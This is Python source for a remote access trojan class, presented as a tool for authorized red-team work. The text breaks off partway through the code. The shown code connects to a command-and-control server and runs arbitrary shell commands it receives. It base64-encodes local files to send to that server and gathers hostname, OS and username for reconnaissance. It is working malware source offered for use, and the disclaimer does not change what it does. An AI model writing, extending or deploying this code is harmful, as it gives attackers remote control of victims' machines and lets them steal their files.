class RemoteAccessTrojan:
    """
    A remote access trojan (RAT) designed for authorized security testing,
    penetration testing, and red team operations.
    """

    def __init__(self, c2_server, c2_port, beacon_interval=30):
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.beacon_interval = beacon_interval
        self.should_run = True
        self.socket = None

    def connect(self):
        """Establish connection to C2 server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.c2_server, self.c2_port))
            return True
        except Exception as e:
            print(f"Connection failed: {e}")
            return False

    def send_data(self, data):
        """Send JSON-encoded data to C2 server"""
        try:
            json_data = json.dumps(data).encode('utf-8')
            self.socket.send(json_data + b'\n')
            return True
        except Exception as e:
            print(f"Failed to send data: {e}")
            return False

    def receive_data(self):
        """Receive JSON-encoded data from C2 server"""
        try:
            buffer = ""
            while True:
                chunk = self.socket.recv(4096).decode('utf-8')
                if not chunk:
                    break
                buffer += chunk
                if '\n' in buffer:
                    lines = buffer.split('\n')
                    buffer = lines.pop()
                    for line in lines:
                        if line.strip():
                            yield json.loads(line)
        except Exception as e:
            print(f"Failed to receive data: {e}")
            yield None

    def execute_command(self, command):
        """Execute system command and capture output"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'exit_code': result.returncode
            }
        except Exception as e:
            return {'error': str(e)}

    def transfer_file(self, file_path, direction='upload'):
        """Transfer files to/from C2 server"""
        try:
            if direction == 'download':
                # Send file to C2
                with open(file_path, 'rb') as f:
                    file_content = f.read()
                    encoded_content = base64.b64encode(file_content).decode('utf-8')
                    return {
                        'action': 'file_download',
                        'path': file_path,
                        'content': encoded_content
                    }
            else:
                # Receive file from C2
                pass
        except Exception as e:
            return {'error': str(e)}

    def gather_system_info(self):
        """Collect system information for reconnaissance"""
        info = {
            'hostname': platform.node(),
            'os': platform.system() + ' ' + platform.release(),
            'architecture': platform.machine(),
            'username': getpass.getuser(),
            'platform': platform.platform()
        }

        # Additional system details
